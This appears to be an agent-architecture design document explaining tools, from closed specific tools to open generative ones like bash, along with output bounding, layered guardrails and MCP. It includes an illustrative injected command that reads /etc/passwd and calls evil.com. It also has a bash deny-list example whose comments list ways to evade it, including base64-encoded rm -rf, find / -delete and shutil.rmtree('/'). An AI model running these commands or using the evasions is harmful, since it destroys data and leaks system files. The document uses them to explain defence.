# Tool

A Tool is a named function with a schema that performs a side effect and returns a result. It is the only primitive through which an agent affects the outside world.

## Why It Matters

The [LLM](llm.md) reasons but cannot act. It cannot read a file, query a database, send an email, or execute code. Every interaction between an agent and its environment goes through Tools. The set of Tools available to an agent defines what the agent can do — an agent with `[fileRead, fileWrite, bash]` is a coding assistant; the same agent with `[queryDatabase, sendEmail, createTicket]` is a support agent. The architecture is identical; the capabilities differ entirely.

## Formal Definition

```typescript
type Tool = {
  name: string;
  schema: JSONSchema; // input schema — what the LLM sees when deciding to call
  execute: (params: unknown) => Promise<ToolResult>; // side effect!
};

type ToolResult = {
  output: string;
  error?: string;
};
```

The `schema` serves a dual purpose: it tells the LLM what parameters the tool accepts (for correct invocation), and it tells the LLM what the tool _does_ (via the name and description fields in the schema). The LLM reads the schema to decide whether and how to call the tool.

The `execute` function is the only place in the entire agent system where side effects occur. Everything else — LLM calls, routing decisions, memory retrieval — is either pure computation or reads. Tools write to the world.

---

## The Tool Expressiveness Spectrum

Not all tools are equal. There is a qualitative break in what different tools allow the agent to do, and this break has deep consequences for capability, safety, and system design.

### Specific Tools — Closed Action Space

```typescript
const fileRead: Tool = {
  name: "file_read",
  schema: { path: "string" },
  execute: (params) => fs.readFile(params.path),
};

const grepTool: Tool = {
  name: "grep",
  schema: { pattern: "string", path: "string" },
  execute: (params) => grep(params.pattern, params.path),
};
```

A specific tool does one thing. The agent can only do what the tool designer anticipated. The capability surface is **closed** — you can enumerate every possible action the tool can take. `file_read` reads one file. `grep` searches for a pattern. No combination of parameters makes them do anything else.

**Properties**: predictable behavior, easy to [guardrail](../harness/guardrail.md), inspectable by humans, testable with conventional techniques.

### Parameterized Tools — Open Queries Within a Bounded Domain

```typescript
const sqlQuery: Tool = {
  name: "query_database",
  schema: { query: "string" },
  execute: (params) => db.execute(params.query),
};

const httpRequest: Tool = {
  name: "http_request",
  schema: { method: "string", url: "string", body: "string" },
  execute: (params) =>
    fetch(params.url, { method: params.method, body: params.body }),
};
```

The tool's domain is bounded (a database, an HTTP endpoint), but the agent composes the parameters to create novel queries. `query_database` can express any SQL query — including `DROP TABLE`. `http_request` can reach any URL. The capability surface is open within the domain, but the domain itself is bounded.

**Properties**: flexible within a domain, guardrails must inspect parameter content (not just tool name), domain-specific risks (SQL injection, SSRF).

### Generative Tools — Open Action Space

```typescript
const bash: Tool = {
  name: "bash",
  schema: { command: "string" },
  execute: (params) => shell.exec(params.command),
};

const pythonExec: Tool = {
  name: "python",
  schema: { code: "string" },
  execute: (params) => python.exec(params.code),
};
```

A generative tool is a computation substrate. The agent writes arbitrary programs. The capability surface is **open** — you cannot enumerate what the agent can do. This is not a difference in degree from specific tools; it is a difference in kind.

Give an agent bash and it can:

- **Use any CLI tool** — grep, git, curl, docker, kubectl, any installed binary
- **Write programs in any language** — Python scripts, Node one-liners, compiled Rust
- **Install new software** — `pip install`, `npm install`, `apt-get` — extending its own capability at runtime
- **Navigate and manipulate the filesystem** — the entire [Workspace](../patterns/workspace.md)
- **Reach the network** — curl, wget, ssh, API calls to any reachable endpoint
- **Manage processes** — start servers, run background tasks, kill processes
- **Chain all of the above** into novel workflows nobody designed

Bash doesn't give the agent _a tool_. It gives the agent _a computer_. It is the Turing machine of tools — it can implement any specific tool. `file_read(path)` is `bash("cat " + path)`. `grep(pattern, path)` is `bash("grep " + pattern + " " + path)`. `http_request(url)` is `bash("curl " + url)`. Every specific tool is a special case of bash.

**Properties**: unbounded capability, hard to guardrail (see below), unpredictable behavior, full environment coupling.

### The Spectrum and Its Consequences

```
Specific          Parameterized        Generative
file_read         sql_query            bash
grep              http_request         python
gmail_send        graphql              code execution
─────────────────────────────────────────────────────→
Closed ←── action space ──→ Open
Easy  ←── guardrailing  ──→ Hard
High  ←── predictability ──→ Low
None  ←── environment coupling ──→ Full
```

This spectrum determines the fundamental trade-off in agent system design: **capability vs. controllability**. A more expressive tool set makes the agent more powerful but harder to constrain. A more specific tool set makes the agent safer but limits what it can do.

---

## Tool Output as Cognitive Architecture

The `execute(params) → ToolResult` interface has two sides. The params side faces the agent's decision — which tool to call and with what arguments. The result side faces the agent's context window — the returned content becomes part of the messages the LLM reasons over for every subsequent step. The params side is well-understood (schema design, cognitive affinity). The result side is equally important and less obvious.

A tool's output is not a log line or an API response for a human developer to scan. It is injected directly into the LLM's finite working memory. Every token in the result competes for attention with the task description, the conversation history, and the results of other tool calls. Irrelevant, verbose, or unbounded output degrades reasoning quality on everything that follows.

This makes tool output formatting a first-class design surface — not an implementation detail hidden below the tool boundary.

### Output Bounding

The highest-leverage output design decision is **bounding**. A search tool that returns 10,000 matching lines has not given the agent more information to work with. It has flooded the agent's working memory with noise that will degrade every subsequent reasoning step until the context is compacted or the session ends.

```typescript
// Unbounded — context flooding
const naiveGrep: Tool = {
  name: "search",
  execute: (params) => grep(params.pattern, params.path),
  // Returns all matches. 10,000 lines? All of them.
};

// Bounded — forces refinement
const boundedSearch: Tool = {
  name: "search",
  execute: (params) => {
    const matches = grep(params.pattern, params.path);
    if (matches.length > 50) {
      return {
        output: `${matches.length} results — too many. Narrow your search.`,
      };
    }
    return { output: formatMatches(matches) };
  },
};
```

The bounded version transforms a context-flooding failure mode into a refinement loop. The agent cannot proceed by being vague — it must be specific. This pushes the agent toward more deliberate, targeted behavior. The SWE-agent paper demonstrated that this single design decision — capping search results at 50 — was among the highest-leverage changes in the entire system.

### Output Formatting

How results are formatted determines whether the LLM can use them efficiently. Line numbers prepended to file content let the agent reference specific lines in subsequent edit commands without counting. Structured summaries of command output let the agent extract what it needs without parsing raw text. Error messages that include both what went wrong and how to fix it close the feedback loop in one step.

```typescript
// Raw output — agent must parse and count
const rawViewer: Tool = {
  name: "view_file",
  execute: (params) => readFile(params.path),
  // Returns file content. Agent must count lines to reference line 47.
};

// Formatted output — cognitive load removed
const formattedViewer: Tool = {
  name: "view_file",
  execute: (params) => {
    const lines = readFile(params.path).split("\n");
    const start = params.offset ?? 0;
    const chunk = lines.slice(start, start + 100);
    return { output: chunk.map((l, i) => `${start + i + 1}\t${l}`).join("\n") };
  },
  // Line numbers prepended. 100-line window. Agent reads "47\t  const x = ..."
  // and can immediately reference line 47 in an edit command.
};
```

### The Design Principle

**Tool output is part of the agent's cognitive architecture, not an implementation detail.** The tool boundary separates agent primitives from regular software, but the result crosses back into agent territory — it becomes context that the LLM reasons over. Design it accordingly: bounded, formatted for LLM consumption, with information density appropriate to the context window budget.

```
params side:     agent → tool     (schema design, cognitive affinity)
result side:     tool → agent     (output bounding, formatting, information density)

Both sides face the LLM. Both are design surfaces.
```

---

## Why Specific Tools Exist Alongside Bash

If bash subsumes all specific tools, why does every agent system ship with both `bash` and `file_read`? Why not just bash?

Three reasons:

**1. Narrowing the action space for safety.** `file_read(path)` can only read one file. The equivalent `bash("cat " + path)` could be `bash("cat /etc/passwd && curl evil.com")`. Specific tools are pre-constrained action spaces that make [guardrailing](../harness/guardrail.md) tractable. They remove degrees of freedom that the agent doesn't need for the task.

**2. Cognitive affinity.** Specific tools with clear schemas are easier for the LLM to use correctly. `file_read` has one parameter (path) with clear semantics. Bash requires the LLM to generate syntactically correct shell commands, handle quoting, deal with pipes, and manage error codes. Specific tools compress the decision space — the LLM makes fewer choices, each choice is less error-prone.

**3. Observability.** A [trace](../verification/trace.md) that shows `file_read("/src/auth.ts")` is immediately understandable. A trace that shows `bash("cat src/auth.ts | head -50")` requires parsing a shell command to understand what happened. Specific tools produce structured, inspectable traces that make [verification](../verification/index.md) easier.

The design principle: **use the least expressive tool that accomplishes the task.** Offer specific tools for common operations (file I/O, search, web fetch). Reserve generative tools for situations where no specific tool exists or where the task genuinely requires composing novel programs.

---

## Guardrailing Across the Spectrum

[Guardrails](../harness/guardrail.md) intercept tool calls and enforce constraints. How complete that enforcement is depends on where the tool sits on the expressiveness spectrum.

Over specific tools, the set of dangerous actions is **enumerable**:

```typescript
// Guardrailing file_write — complete, deterministic
const noSystemWrites: Guardrail = {
  pre: (action) => {
    if (action.name === "file_write" && action.params.path.startsWith("/etc/"))
      return { deny: "cannot write to system directories" };
    return { allow: true };
  },
};
```

Over generative tools, the set of dangerous actions is **unbounded**:

```typescript
// Guardrailing bash — incomplete, pattern-matching
const noDangerousCommands: Guardrail = {
  pre: (action) => {
    if (action.name === "bash") {
      const cmd = action.params.command;
      if (cmd.includes("rm -rf")) return { deny: "destructive delete" };
      if (cmd.includes("push --force")) return { deny: "force push" };
      // ... but what about: $(echo cm0gLXJm | base64 -d)?
      // ... or: find / -delete?
      // ... or: python -c "import shutil; shutil.rmtree('/')"?
      // The set of equivalent dangerous commands is infinite.
    }
    return { allow: true };
  },
};
```

Pattern-based guardrails catch common dangerous commands and raise the bar against accidental damage. For complete coverage over generative tools, production systems combine guardrails with environment-level containment — **layered defense**:

1. **Specific tools for common operations** — guardrail interception provides complete coverage
2. **Pattern-based guardrails on bash** — catch known dangerous commands at the tool call level
3. **Sandboxed environments** — contain blast radius at the environment level (network isolation, filesystem restrictions, no credentials)
4. **Human-in-the-loop** — require approval for commands matching risk patterns

This is how guardrails and environments compose: guardrails enforce constraints at the tool boundary, sandboxes enforce constraints at the environment boundary. For specific tools, the tool boundary is sufficient. For generative tools, both layers work together.

---

## Generative Tools as the Interface to the Environment

Generative tools are the mechanism through which the agent accesses and modifies its [Environment](../environment/environment.md).

With specific tools, the Environment is a passive, deployment-time configuration — the agent gets `file_read` configured to access a specific directory, and that's all it can reach. With bash, the Environment becomes something the agent **actively reaches and modifies through a tool**:

```typescript
// The agent modifies its own environment:
bash("npm install some-new-package"); // extends available libraries
bash("pip install playwright && playwright install"); // adds browser capability
bash("docker run -d postgres"); // spins up infrastructure
bash("ssh remote-server 'deploy.sh'"); // reaches external systems
```

The agent's capability surface is no longer bounded by the tools the harness provides. It's bounded by the **environment** — what's installed, what's network-reachable, what credentials are available. This is why sandboxing matters: the sandbox defines the true capability boundary for an agent with generative tools.

```
Specific tools:    capability = Σ(tool schemas)
Generative tools:  capability = f(environment)
```

---

## MCP and Dynamic Tool Discovery

MCP (Model Context Protocol) tools occupy an interesting position on the expressiveness spectrum. Each individual MCP tool is specific — `gmail_send(to, subject, body)` does one thing with a clear schema. But the _set of available MCP tools_ is open-ended — the agent can discover and invoke tools it wasn't configured with at startup.

This gives MCP a way to achieve open-ended capability through a **collection of constrained tools** rather than through one unconstrained tool. Architecturally, this is safer than bash:

| Property          | Bash                    | MCP Tool Collection             |
| ----------------- | ----------------------- | ------------------------------- |
| Individual action | Unbounded               | Bounded per tool                |
| Total capability  | Open (any command)      | Open (any registered tool)      |
| Guardrailability  | Hard (pattern matching) | Easy (per-tool schema)          |
| Discoverability   | None (agent explores)   | Structured (registry + schemas) |
| Trust model       | Trust the sandbox       | Trust per tool provider         |

MCP tools are the safe version of bash's openness — they provide the extensibility (new capabilities at runtime) without the uncontrollability (arbitrary commands). This is why MCP and similar protocols matter: they allow the tool set to grow without giving up the ability to reason about and constrain individual actions.

---

## Tools as the Architectural Boundary

Tools define the boundary between the agent system and regular software. The `execute(params) → result` interface is the seam:

```
Agent system:       LLM + Tool (primitives) + patterns built over them
                           ↓
Tool boundary:      execute(params) → result
                           ↓
Everything below:   Regular software (databases, pipelines, APIs, infrastructure)
```

- **Above the boundary**: the agent system — LLM reasoning plus the harness that structures it (AgentLoop, Session, Guardrail, Agent) and the patterns composed on top (Memory, Channel, orchestration). This is where non-deterministic reasoning happens.
- **Below the boundary**: regular software engineering — databases, APIs, pipelines, infrastructure. This is deterministic, well-understood, and testable with conventional techniques.

The agent doesn't know or care what lives behind the tool interface. A `query_portfolio` tool might execute a simple SQL query or trigger a multi-stage ETL pipeline — the agent sees the same `(params) → result` signature either way. This separation is what makes agent systems composable: you can swap the implementation behind any tool without changing the agent.

---

## Related

- [LLM](llm.md) — the other atomic primitive; LLM reasons, Tool acts
- [AgentLoop](../harness/agent-loop.md) — the recursive cycle that connects LLM decisions to Tool execution
- [Guardrail](../harness/guardrail.md) — constraints that wrap tool execution; hard for specific tools, best-effort for generative tools
- [Workspace](../patterns/workspace.md) — the structured data space accessed through tools; filesystem tools have maximum cognitive affinity
- [Environment](../environment/environment.md) — the substrate generative tools reach into; the capability boundary for open-action-space tools
- [Agent](../harness/agent.md) — wires a Session to a specific Environment behind a Frontend
